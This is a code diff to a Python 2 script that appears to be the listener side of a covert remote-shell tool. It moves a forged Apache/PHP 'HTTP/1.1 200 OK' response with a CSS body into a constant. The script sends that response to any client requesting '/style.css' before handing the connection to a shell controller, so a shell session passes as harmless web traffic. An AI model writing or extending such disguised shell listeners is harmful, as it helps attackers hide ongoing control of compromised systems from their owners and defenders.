@@ -7,6 +7,14 @@ import argparse
 from datetime import datetime
 
 SIZE = 1024
+FAKEOK = """HTTP/1.1 200 OK\r
+Date: Tue, 19 Mar 2013 22:12:25 GMT\r
+Server: Apache\r
+X-Powered-By: PHP/5.3.10-1ubuntu3.2\r
+Content-Length: 364\r
+Content-Type: text/plain\r
+\r
+body{background-color:#f0f0f2;margin:0;padding:0;font-family:"Open Sans","Helvetica Neue",Helvetica,Arial,sans-serif}div{width:600px;margin:5em auto;padding:50px;background-color:#fff;border-radius:1em}a:link,a:visited{color:#38488f;text-decoration:none}@media (max-width:700px){body{background-color:#fff}div{width:auto;margin:0 auto;border-radius:0;padding:1em}}"""
 
 
 def get_args():
@@ -64,8 +72,7 @@ def main():
     print '[i] Connected By: {} at {}'.format(addr, datetime.now())
     ping = conn.recv(SIZE)
     if ping.startswith('GET /style.css HTTP/1.1'):
-        with open('fakeOK.txt') as ok:
-            conn.send(ok.read())
+        conn.send(FAKEOK)
         conn.close()
         ctrl_shell_server(s, PORT)
 
